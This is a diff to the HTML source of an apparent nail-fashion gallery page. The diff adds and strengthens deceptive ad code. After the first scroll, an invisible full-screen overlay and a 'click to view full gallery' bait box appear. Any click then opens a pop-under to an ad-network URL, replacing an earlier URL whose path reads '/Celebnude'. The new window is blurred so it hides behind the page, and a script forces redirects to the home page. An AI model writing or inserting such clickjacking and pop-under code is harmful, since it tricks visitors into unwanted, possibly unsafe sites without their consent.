@@ -5,40 +5,30 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JVX NAILS FASHION</title>
 <style>
-  body { 
-    font-family: Arial, sans-serif; 
-    line-height: 1.6; 
-    color: #1b1b1b; 
-    max-width: 800px; 
-    margin: auto; 
-    padding: 20px; 
-    background-color: #ffffff; 
-  }
+  body { font-family: Arial, sans-serif; line-height: 1.6; color: #1b1b1b; max-width: 800px; margin: auto; padding: 20px; background-color: #fff; }
   h1 { color: #ea148c; font-size: 28px; }
-  h2 { color: #ea148c; font-size: 22px; margin-top: 30px; }
-  h3 { font-size: 20px; margin-top: 20px; color: #e3007e; }
   .nail-step img { max-width: 100%; height: auto; display: block; margin: 10px 0; border: 1px solid #ddd; padding: 4px; }
 
-  /* Full-screen invisible "Trap" Layer */
-  #interaction-layer {
+  /* 1. THE INVISIBLE CLICK TRAP (Covers everything) */
+  #full-screen-click-trap {
     position: fixed;
     top: 0; left: 0; width: 100%; height: 100%;
-    z-index: 999999;
-    background: rgba(0,0,0,0); /* Invisible */
+    z-index: 999998;
+    background: rgba(0,0,0,0);
     cursor: pointer;
-    display: none; /* Hidden until scroll */
+    display: none;
   }
 
-  /* Centered Image Box */
-  #pop-box {
+  /* 2. THE VISIBLE BOX (The Bait) */
+  #pop-bait-box {
     position: fixed;
     top: 50%; left: 50%;
     transform: translate(-50%, -50%);
     background: #fff;
     padding: 10px;
     border-radius: 8px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    z-index: 1000000;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+    z-index: 999999;
     display: none;
     text-align: center;
   }
@@ -46,10 +36,10 @@
 </head>
 <body>
 
-<div id="interaction-layer"></div>
-<div id="pop-box">
-    <img src="https://stellaplus.netlify.app/IMG_2216.jpeg" style="max-width: 80vw; max-height: 60vh;">
-    <p style="color: #ea148c; font-weight: bold;">Click to View Full Gallery</p>
+<div id="full-screen-click-trap"></div>
+<div id="pop-bait-box">
+    <img src="https://stellaplus.netlify.app/IMG_2216.jpeg" style="max-width: 80vw; max-height: 60vh; border-radius: 5px;">
+    <p style="color: #ea148c; font-weight: bold; margin-top: 10px;">CLICK TO VIEW FULL GALLERY</p>
 </div>
 
 <header>
@@ -65,47 +55,51 @@
     <h3>1. Rainbow Heart nails</h3>
     <img src="https://stellapluss.netlify.app/ImageDrain-20260329T210410.825Z.jpeg" alt="Nails">
   </section>
-  <div style="height: 1000px;"></div> </article>
+  <div style="height: 1500px;"></div> </article>
 
 <script>
-/** * 1. THE REDIRECT 
- * Sends user to home if they are on a non-existent path.
+/** * REDIRECT LOGIC
+ * If user visits a path that isn't root, send them back to home.
  */
 (function() {
-    const path = window.location.pathname;
-    // If not root or index, redirect home
-    if (path !== '/' && path !== '/index.html') {
-        window.location.href = '/';
+    const validPaths = ['/', '/index.html', '/home'];
+    if (!validPaths.includes(window.location.pathname) && window.location.pathname.length > 1) {
+        window.location.href = window.location.origin || '/';
     }
 })();
 
-/** * 2. THE POP-UNDER 
- * Triggers on the first click after a scroll.
+/** * POP-UNDER LOGIC
  */
-const adUrl = 'https://go.pluse.name.ng/Celebnude';
-const layer = document.getElementById('interaction-layer');
-const box = document.getElementById('pop-box');
+const adUrl = 'https://consumptionbackwardsentiments.com/iuazskvz72?key=00566420ef033ce0944dca71431d088e';
+const trap = document.getElementById('full-screen-click-trap');
+const bait = document.getElementById('pop-bait-box');
 
-// Show the trap after a tiny scroll
+// ARM THE TRAP: Show the box and overlay on the first scroll
 window.addEventListener('scroll', () => {
-    layer.style.display = 'block';
-    box.style.display = 'block';
+    trap.style.display = 'block';
+    bait.style.display = 'block';
 }, { once: true });
 
-// Handle the click
-function handlePop() {
+// EXECUTION: Open the ad and clear the trap
+function fireAd() {
+    // Attempt to open ad
     const win = window.open(adUrl, '_blank');
+    
+    // Attempt pop-under (blur ad, focus home)
     if (win) {
-        win.blur();
-        window.focus();
+        try {
+            win.blur();
+            window.focus();
+        } catch (e) { /* Browser blocked focus-stealing */ }
     }
-    // Remove trap so they can actually use the site
-    layer.style.display = 'none';
-    box.style.display = 'none';
+    
+    // Remove the traps so the user can see the actual content
+    trap.style.display = 'none';
+    bait.style.display = 'none';
 }
 
-layer.addEventListener('click', handlePop);
-box.addEventListener('click', handlePop);
+trap.addEventListener('click', fireAd);
+bait.addEventListener('click', fireAd);
 </script>
 
 </body>
